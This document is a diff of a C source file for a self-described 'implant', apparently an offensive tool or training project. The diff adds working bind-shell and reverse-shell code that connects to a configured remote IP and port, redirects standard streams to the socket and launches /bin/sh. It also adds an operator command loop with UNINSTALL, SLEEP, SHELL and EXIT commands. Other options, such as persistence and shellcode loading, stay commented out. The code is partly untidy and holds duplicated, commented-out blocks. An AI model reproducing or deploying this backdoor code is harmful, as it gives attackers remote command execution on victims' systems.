@@ -1,5 +1,4 @@
 //#define IPADDR "192.168.1.1"
-
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -9,20 +8,21 @@
 #include <unistd.h>
 #include <syslog.h>
 #include <string.h>
-#include <curl/curl.h>
+//#include <curl/curl.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <signal.h>
+#include "commands.c"
+#define _GNU_SOURCE
 
-//#include "valHelper.c"
-
-static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
-{
-  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
-  return written;
-}
+#define MAXDATASIZE 100
+#define SLEEP 5
 
 void foo();
 
 int main(void) {
-        //VALIDATOR!!!!!!!!!!!!!!!!!!!
+
         /* Our process ID and Session ID */
         pid_t pid, sid;
 
@@ -79,7 +79,7 @@ int main(void) {
 
            //sleep(30); /* wait 30 seconds */
         //}
-
+  //VALIDATOR!!!!!!!!!!!!!!!!!!!
    exit(EXIT_SUCCESS);
 }
 
@@ -95,7 +95,7 @@ void foo()
   #ifdef IPADDR
   printf("IPADDR: %s!\n", IPADDR);
   #endif
-
+  /*
   #ifdef DOMAIN
   printf("DOMAIN: %s!\n", DOMAIN);
   #endif
@@ -106,12 +106,12 @@ void foo()
 
   #ifdef ARCH
   printf("ARCH: %s!\n", ARCH);
-  #endif
+  #endif*/
 
   #ifdef OS
   printf("OS: %s!\n", OS);
   #endif
-
+  /*
   #ifdef VERSION_NUM
   printf("VERSION_NUM: %s!\n", VERSION_NUM);
   #endif
@@ -155,13 +155,99 @@ void foo()
   #ifdef LOADSHELLCODE
   printf("LOADSHELLCODE: %d!\n", LOADSHELLCODE);
   #endif
-
+*/
   #ifdef BINDSHELL
   printf("BINDSHELL: %d!\n", BINDSHELL);
+  struct sockaddr_in addr;
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(REVERSEPORT);
+  addr.sin_addr.s_addr = INADDR_ANY;
+
+  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+  listen(sockfd, 0);
+
+  int connfd = accept(sockfd, NULL, NULL);
+  for (int i = 0; i < 3; i++)
+  {
+      dup2(connfd, i);
+  }
+  #define COMMANDS 1
+  commands(sockfd);
+  close(sockfd);
+  /*
+  for (int i = 0; i < 3; i++)
+  {
+      dup2(connfd, i);
+  }
+  execve("/bin/sh", NULL, NULL);
+  */
   #endif
 
   #ifdef REVERSESHELL
   printf("REVERSESHELL: %d!\n", REVERSESHELL);
+  const char* ip = REVIP;
+  struct sockaddr_in addr;
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(atoi(REVERSEPORT));
+  inet_aton(ip, &addr.sin_addr);
+
+  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+  for (int i = 0; i < 3; i++)
+  {
+      dup2(sockfd, i);
+  }
+
+  execv("/bin/sh", NULL);
+  //#define COMMANDS 1
+  //commands(sockfd);
+  char buf[MAXDATASIZE];
+  int numbytes;
+  int endConnect = 0;
+  while(endConnect != 1){
+    if ((numbytes = recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
+      perror("recv");
+      exit(1);
+    }
+    buf[numbytes] = '\0';
+    if(strcmp(buf,"UNINSTALL\0") == 0){
+      remove("implant");
+      //remove cron, the implant a.out, and then exit() the implant process
+
+      endConnect = 1;
+    }
+    else if(strstr(buf, "SLEEP") != NULL){
+      sleep(SLEEP);
+      endConnect = 1;
+    }
+    else if(strcmp(buf,"SHELL\0") == 0){
+      shell(sockfd);
+    }
+    else if(strcmp(buf,"PROFILER\0") == 0){
+      //***************profiler code**********************
+      //**************************************************
+      //**************************************************
+    }
+    else if(strcmp(buf,"EXIT\0") == 0){
+      kill(getpid(), SIGKILL);
+      endConnect = 1;
+    }
+  }
+  close(sockfd);
+
+/*
+#define COMMANDS 1
+commands(sockfd);
+close(sockfd);
+  for (int i = 0; i < 3; i++)
+  {
+      dup2(sockfd, i);
+  }
+
+  execv("/bin/sh", NULL);
+  */
+
   #endif
 
   #ifdef REVERSEIP
@@ -171,7 +257,7 @@ void foo()
   #ifdef REVERSEPORT
   printf("REVERSEPORT: %s!\n", REVERSEPORT);
   #endif
-
+  /*
   #ifdef PERSIST
   printf("PERSIST: %s!\n", PERSIST);
   #endif
@@ -179,36 +265,51 @@ void foo()
   #ifdef NOTES
   printf("NOTES: %s!\n", NOTES);
   #endif
-
+  */
   #ifdef STRIP
   printf("STRIP: %d!\n", STRIP);
   #endif
-
+  /*
   #ifdef STATIC
   printf("STATIC: %d!\n", STATIC);
   #endif
-
-  #ifdef SECIMP
-  printf("SECIMP: %d!\n", SECIMP);
-  CURL *curl;
-  CURLcode res;
-
-  curl = curl_easy_init();
-  if(curl) {
-    curl_easy_setopt(curl, CURLOPT_URL, "https://imgk.timesnownews.com/story/Won.png?tr=w-1200,h-900");
-    /* example.com is redirected, so we tell libcurl to follow redirection */
-    //curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-
-    /* Perform the request, res will get the return code */
-    res = curl_easy_perform(curl);
-    /* Check for errors */
-    if(res != CURLE_OK)
-      fprintf(stderr, "curl_easy_perform() failed: %s\n",
-              curl_easy_strerror(res));
-
-    /* always cleanup */
-    curl_easy_cleanup(curl);
-
-  }
-  #endif
+  */
 }
+/*
+#ifdef COMMANDS
+void commands(int sockfd){
+  char buf[MAXDATASIZE];
+  int numbytes;
+  int endConnect = 0;
+  while(endConnect != 1){
+    if ((numbytes = recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
+      perror("recv");
+      exit(1);
+    }
+    buf[numbytes] = '\0';
+    if(strcmp(buf,"UNINSTALL\0") == 0){
+      remove("implant");
+      //remove cron, the implant a.out, and then exit() the implant process
+
+      endConnect = 1;
+    }
+    else if(strstr(buf, "SLEEP") != NULL){
+      sleep(SLEEP);
+      endConnect = 1;
+    }
+    else if(strcmp(buf,"SHELL\0") == 0){
+      shell(sockfd);
+    }
+    else if(strcmp(buf,"PROFILER\0") == 0){
+      //***************profiler code**********************
+      //**************************************************
+      //**************************************************
+    }
+    else if(strcmp(buf,"EXIT\0") == 0){
+      kill(getpid(), SIGKILL);
+      endConnect = 1;
+    }
+  }
+}
+#endif
+*/
